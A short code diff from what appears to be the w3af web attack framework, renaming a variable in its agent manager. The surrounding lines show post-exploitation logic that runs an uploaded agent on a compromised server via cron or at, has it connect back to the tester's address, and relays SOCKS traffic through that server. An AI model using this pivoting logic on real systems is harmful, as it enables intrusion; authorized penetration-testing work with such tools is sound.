@@ -32,6 +32,7 @@ import core.data.kb.config as cf
 import os
 import time
 
+
 class w3afAgentManager( w3afThread ):
     '''
     Start a w3afAgent, to do this, I must transfer the agent client to the
@@ -89,18 +90,18 @@ class w3afAgentManager( w3afThread ):
                 om.out.information('Finished w3afAgentClient upload.')
                 
                 # Start the w3afAgentServer
-                as = w3afAgentServer( socksPort=self._socksPort, listenPort=inboundPort )
-                as.start2()
+                agent_server = w3afAgentServer( socksPort=self._socksPort, listenPort=inboundPort )
+                agent_server.start2()
                 # Wait for it to start.
                 time.sleep(0.5)
                 
-                if not as.isRunning():
-                    om.out.error( as.getError() )
+                if not agent_server.isRunning():
+                    om.out.error( agent_server.getError() )
                 else:
                     # And now start the w3afAgentClient on the remote server using cron / at
                     self._delayedExecution( interpreter + ' ' + filename + ' ' + cf.cf.getData( 'localAddress' ) + ' ' + str( inboundPort ) )
                 
-                    if not as.isWorking():
+                    if not agent_server.isWorking():
                         om.out.error('Something went wrong, the w3afAgent client failed to connect back.')
                     else:
                         om.out.information('You may start using the w3afAgent that is listening on port '+ str(self._socksPort) +'. All connections made through this SOCKS daemon will be relayed using the compromised server.')
